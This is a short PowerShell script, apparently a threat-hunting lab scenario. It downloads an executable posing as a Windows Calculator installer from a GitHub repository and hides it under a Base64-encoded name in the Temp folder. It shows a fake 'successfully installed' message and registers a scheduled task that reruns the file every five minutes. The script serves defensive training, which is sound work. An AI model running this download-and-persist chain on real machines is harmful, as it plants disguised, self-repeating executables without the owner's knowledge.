
# Define URLs and Paths
$downloadUrl = "https://raw.githubusercontent.com/mervintab/threat-hunting-scenarios/main/assets/Windows%20Calculator%20Installer.exe"
$downloadsPath = "$env:USERPROFILE\Downloads"
$tempPath = "$env:TEMP"
$originalFile = Join-Path $downloadsPath "Windows Calculator Installer.exe"

# Step 2: Download the installer
Invoke-WebRequest -Uri $downloadUrl -OutFile $originalFile

# Step 3: Encode filename in Base64
$base64Name = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes("calculator.exe")) + ".exe"
$base64File = Join-Path $downloadsPath $base64Name
Rename-Item -Path $originalFile -NewName $base64Name

# Step 4: Move file to Temp folder
Move-Item -Path $base64File -Destination $tempPath

# Step 5: Install (Simulated by simply copying to Temp for now)
$installedFile = Join-Path $tempPath "calculator.exe"
Copy-Item -Path (Join-Path $tempPath $base64Name) -Destination $installedFile

# Step 6: Popup Message
Start-Process cmd.exe "/c echo Calculator successfully installed && pause"

# Step 7: Create Scheduled Task
$action = New-ScheduledTaskAction -Execute "$installedFile"
$trigger = New-ScheduledTaskTrigger -Once -At (Get-Date).AddMinutes(1) -RepetitionInterval (New-TimeSpan -Minutes 5) -RepetitionDuration ([TimeSpan]::MaxValue)
Register-ScheduledTask -TaskName "CalculatorTask" -Action $action -Trigger $trigger -Description "Run Calculator.exe every 5 minutes"
